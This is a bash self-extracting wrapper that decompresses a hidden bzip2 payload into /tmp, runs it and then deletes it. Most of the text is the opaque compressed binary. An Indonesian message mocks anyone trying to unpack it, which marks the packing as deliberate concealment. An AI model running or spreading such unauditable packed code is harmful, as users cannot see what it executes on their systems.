#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�Ŷ @_�u����?�������PD@  PL{�s&�mp���@�5O�OS�yG�����~��?T2�4m@=CL#�=A$���
bOS@~��4� �P �b ��C*zz�����S�4 �z�ѣ@��i�@�ɠ d�  2dA$SL�!�h�Q�?T~�ޔd�jfj��&��Қ��@L��a�z�Z�al}*�6����4HvA���i1���E�6�w�3����T/��� �7��t���mo
H/�o�йw=�S��%i�q��q��8<�����o�S�c *��p����*H�<���̇ā6��fz�qN���ʺ'��X�hp�� �oF�����y�Ц��B��+�����4+�+?hW_8�[��\����Bc�ڶ5g=IT��2}���b��[�W��T|y�c�Ɨz�cn�����6�/F��`_1��P;f�k���@Qp�����=#8ɚWl�Osj���������f�C�Q��<�o,�O�䗜bg��0��d �%���w�~�^���2+��c/3S8ldI\��{�qWJT5�c7�`���B��H��IQ���}����Ĭ�FRt2xX4���b���0�-�ǫ=���_���:�&E��LC�+�^w���e@�'�K@�'���n��3�Vըb���@c���B��$�����D� 5Z�O���� &�T�Ѱ���� ��m�C��{v���qҦU@]h��yʆ��*���/(�ȩ�X�^'�5-��Z�pČ���:)��00G�l-�5&��"�H� ��*���]���"2	�������7�H��z��'(6G�N̉�?\h�I���9���
��KV�oհI�Z�K��&]�\�x�*(7d���RŮ�Q�ԃ*4�Hb �L1���&��ᚩG/��{��R�@�b3#�=6^���R���u��'�Hᥕ瑊�G����]�;���+��^+��7��\��g!�)9q�T���wvKѓa&"�c�����WV䊅k$�����+�� ���Z;H:�ch:�� 8t��RF��qv5*�����{�:�妬l�C����3,9���6�V���k��JꌲY��k����\Ņ'*�k[+�&y�,�Uz��bC�*7����O
�C��Q;�HM+p��CIN.��(�d2�2E�A`�8�"31�h��O>B�VTX����H�X't����E���_ 2���'�T�q p̡Q&�u5F/:�e��� ����Ѷ��%̃�#��8���1Z�;T��ht��E���ESΈ�
��k$�e4�cw���Ǥ́gD�@�����1�`W[2�z��ń�\PG`}����R��V�fv}��	L�];��J	����"�(HtS�� 